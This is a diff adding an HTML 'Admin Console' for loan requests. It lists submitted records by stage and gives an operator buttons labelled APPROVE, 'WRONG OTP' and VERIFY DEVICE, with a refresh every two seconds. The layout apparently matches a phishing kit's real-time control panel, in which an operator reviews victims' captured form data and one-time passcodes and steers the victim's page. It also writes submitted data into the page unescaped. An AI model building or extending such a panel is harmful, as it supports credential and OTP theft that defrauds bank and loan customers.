@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Admin Console - Loan Requests</title>
+  <style>
+    body{ font-family: Arial, sans-serif; padding: 2%; }
+    .req{ border:1px solid #ccc; padding:1%; margin-bottom:1%; }
+    .meta{ color: #666; font-size: 90%; }
+    button{ margin-right: 8px; }
+  </style>
+</head>
+<body>
+  <h1>Admin Console</h1>
+  <div id="list"></div>
+  <script>
+    function loadRequests(){ try { return JSON.parse(localStorage.getItem('loan_requests')||'[]'); } catch(e){ return []; } }
+    function saveRequests(list){ localStorage.setItem('loan_requests', JSON.stringify(list)); }
+    function render(){ const list = loadRequests(); const el = document.getElementById('list'); el.innerHTML = '';
+      if(list.length===0){ el.innerHTML = '<p>No requests</p>'; return; }
+      list.slice().reverse().forEach(r=>{ const d = document.createElement('div'); d.className='req'; d.innerHTML = `<div><strong>ID:</strong> ${r.id} <span class='meta'>[${r.stage}]</span></div><div><pre>${JSON.stringify(r.data,null,2)}</pre></div><div class='meta'>Status: ${r.status||'pending'}</div>`;
+        const approve = document.createElement('button'); approve.innerText='APPROVE'; approve.addEventListener('click', ()=>{ r.status='approved'; saveRequests(list); render(); });
+        const wrong = document.createElement('button'); wrong.innerText = (r.stage==='otp')? 'WRONG OTP' : 'WRONG'; wrong.addEventListener('click', ()=>{ r.status='rejected'; saveRequests(list); render(); });
+        const verify = document.createElement('button'); verify.innerText='VERIFY DEVICE'; verify.addEventListener('click', ()=>{ r.status='verify'; saveRequests(list); render(); });
+        d.appendChild(approve); d.appendChild(wrong); d.appendChild(verify);
+        el.appendChild(d);
+      }); }
+    render();
+    // keep list updated
+    setInterval(render, 2000);
+  </script>
+</body>
+</html>
